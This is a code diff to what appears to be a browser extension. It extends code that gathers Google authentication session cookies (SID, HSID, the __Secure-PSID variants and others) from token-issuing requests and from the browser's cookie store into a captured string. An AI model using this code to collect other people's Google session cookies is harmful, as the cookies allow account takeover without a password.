@@ -1,5 +1,8 @@
 const FIRST_PARTY_AUTH_COOKIES = new Set([
   "SID", "HSID", "SSID", "APISID", "SAPISID",
+  "__Secure-1PSID", "__Secure-3PSID",
+  "__Secure-1PAPISID", "__Secure-3PAPISID",
+  "__Secure-1PSIDTS", "__Secure-3PSIDTS",
 ]);
 
 let capturedData = {
@@ -79,18 +82,18 @@ function captureIssueToken(details) {
 function captureRequestCookies(details) {
   if (!details.url.includes("action=issueToken")) return;
 
+  const cookieMap = new Map();
   const cookieHeader = details.requestHeaders.find(
     (h) => h.name.toLowerCase() === "cookie"
   );
-  if (!cookieHeader) return;
-
-  const cookieMap = new Map();
-  cookieHeader.value.split("; ").forEach((pair) => {
-    const eqIdx = pair.indexOf("=");
-    if (eqIdx > 0) {
-      cookieMap.set(pair.substring(0, eqIdx), pair.substring(eqIdx + 1));
-    }
-  });
+  if (cookieHeader) {
+    cookieHeader.value.split("; ").forEach((pair) => {
+      const eqIdx = pair.indexOf("=");
+      if (eqIdx > 0) {
+        cookieMap.set(pair.substring(0, eqIdx), pair.substring(eqIdx + 1));
+      }
+    });
+  }
 
   chrome.cookies.getAll({ url: "https://accounts.google.com" }, (cookies) => {
     if (cookies) {
@@ -101,11 +104,13 @@ function captureRequestCookies(details) {
       }
     }
 
-    capturedData.cookies = Array.from(cookieMap.entries())
-      .map(([name, value]) => `${name}=${value}`)
-      .join("; ");
+    if (cookieMap.size > 0) {
+      capturedData.cookies = Array.from(cookieMap.entries())
+        .map(([name, value]) => `${name}=${value}`)
+        .join("; ");
 
-    checkComplete();
+      checkComplete();
+    }
   });
 }
 
